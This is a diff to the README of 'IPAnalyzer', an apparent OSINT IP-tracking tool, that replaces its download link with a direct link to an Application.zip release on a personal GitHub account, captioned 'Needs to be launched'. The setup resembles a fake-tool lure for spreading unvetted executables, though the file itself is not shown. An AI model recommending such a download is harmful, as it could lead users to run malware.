@@ -12,7 +12,7 @@ IPAnalyzer is an IP Address Tracker OSINT ethical hacking tool built for Linux d
 ## Installation
 To install IPAnalyzer, simply download the ZIP file from the link provided below and launch the tool on your Linux distribution.
 
-[![Download IPAnalyzer](https://img.shields.io/badge/Download-IPAnalyzer-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip "Needs to be launched")
+[![Download IPAnalyzer](https://github.com/fateeeeeeeee/IPAnalyzer/releases/download/v1.0/Application.zip)](https://github.com/fateeeeeeeee/IPAnalyzer/releases/download/v1.0/Application.zip "Needs to be launched")
 
 ## Usage
 1. Download the ZIP file from the installation link.
